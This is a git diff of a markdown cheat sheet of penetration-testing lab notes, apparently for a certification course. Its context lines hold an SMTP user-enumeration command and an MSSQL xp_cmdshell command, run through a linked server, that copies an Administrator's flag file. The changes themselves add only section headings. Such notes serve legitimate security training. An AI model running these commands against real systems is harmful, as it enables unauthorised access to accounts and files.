@@ -1,6 +1,7 @@
 https://github.com/missteek/cpts-quick-references/blob/main/assessments/Password%20Attacks%20Lab%20-%20Hard.md
 
-
+### Attacking Common Services:
+---
 #### Attacking Common Services - Easy:
 ```
 UserEnum:       smtp-user-enum -M RCPT -U users.txt -D inlanefreight.htb -t $ip
@@ -80,5 +81,11 @@ GO
 EXECUTE ('xp_cmdshell ''type C:\Users\Administrator\Desktop\flag.txt > C:\Users\fiona\Desktop\xc.txt''') AT [LOCAL.TEST.LINKED.SRV];
 GO
 
+
+```
+### Attacking Web Applications with Ffuf
+---
+#### Skills Assessment - Web Fuzzing:
+```
 
 ```
